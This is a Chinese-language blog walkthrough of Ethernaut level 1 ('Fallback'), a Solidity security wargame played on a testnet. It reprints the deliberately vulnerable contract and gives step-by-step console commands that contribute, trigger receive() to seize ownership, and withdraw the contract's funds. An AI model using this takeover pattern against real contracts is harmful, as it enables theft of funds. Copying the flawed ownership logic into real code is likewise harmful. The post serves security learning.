---
title: Ethernaut第1关-fallback解题指南
date: 2025-04-09 00:30:46
tags: web3,securtiy
---

# Ethernaut 第 1 关 - Fallback 解题指南

Ethernaut 是 OpenZeppelin 提供的 Web3/Solidity 战游戏，通过“黑客”智能合约帮助学习以太坊安全知识。第 1 关“Fallback”是一个基础关卡，旨在让玩家理解回退函数的潜在漏洞。本指南详细解释如何解决关卡 [https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)，并提供完整步骤。

<!-- more -->

## 前提条件
- 安装并配置 [Metamask](https://metamask.io/)，连接到 Sepolia 测试网。
- 从 [Sepolia Faucet](https://sepoliafaucet.com/) 获取测试网 ETH。
- 访问 [Ethernaut 官网](https://ethernaut.openzeppelin.com/) 并生成新实例。

## 关卡目标
- 成为合约的 `owner`。
- 将合约余额减少到 0（初始余额为 0.001 ETH）。

## 解决步骤

### 1. 准备环境
- 确保 Metamask 已连接到 Sepolia 测试网并有足够的 ETH。
- 在 Ethernaut 第 1 关页面点击“生成新实例”，获取合约地址。
- 打开浏览器开发者工具（F12），切换到 Console 标签。

### 2. 发送初始贡献
- 调用 `contribute` 函数，发送少量 ETH（例如 0.0001 ETH）：
  ···javascript
  await contract.contribute({ value: ethers.parseEther("0.0001") })
  ···
- 这将记录你的贡献，满足回退函数的要求。

### 3. 触发回退函数接管所有权
- 直接向合约发送 ETH（例如 0.001 ETH），触发 `receive` 函数：
  ···javascript
  await web3.eth.sendTransaction({
      from: player,
      to: contract.address,
      value: ethers.parseEther("0.001")
  })
  ···
- 发送成功后，你将成为新的 `owner`。

### 4. 提取资金
- 调用 `withdraw` 函数提取所有余额：
  ···javascript
  await contract.withdraw()
  ···
- 合约余额将被转回你的钱包。

### 5. 验证完成
- 检查合约余额（应为 0）：
  ···javascript
  await web3.eth.getBalance(contract.address)
  ···
- 检查 `owner`（应为你的地址）：
  ···javascript
  await contract.owner()
  ···
- 在 Ethernaut 页面点击“Submit Instance”验证。

## 注意事项
- **ETH 单位**：`ethers.parseEther("0.001")` 将 0.001 ETH 转换为 Wei。
- **交易确认**：每次调用需等待交易确认。
- **成本**：需支付少量 ETH，但提取的资金会覆盖成本。

## 合约代码参考
以下是关卡的简化合约代码：
···solidity
contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    receive() external payable {
        require(msg.value > 0);
        require(contributions[msg.sender] > 0);
        owner = msg.sender;
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
···

## 结果
通过利用回退函数的漏洞，你成功接管合约并提取所有资金，完成第 1 关。这一关展示了回退函数设计不当的安全风险。

## 资源与参考
- [Ethernaut 官网](https://ethernaut.openzeppelin.com/)
- [Metamask 官网](https://metamask.io/)
- [Sepolia Faucet](https://sepoliafaucet.com/)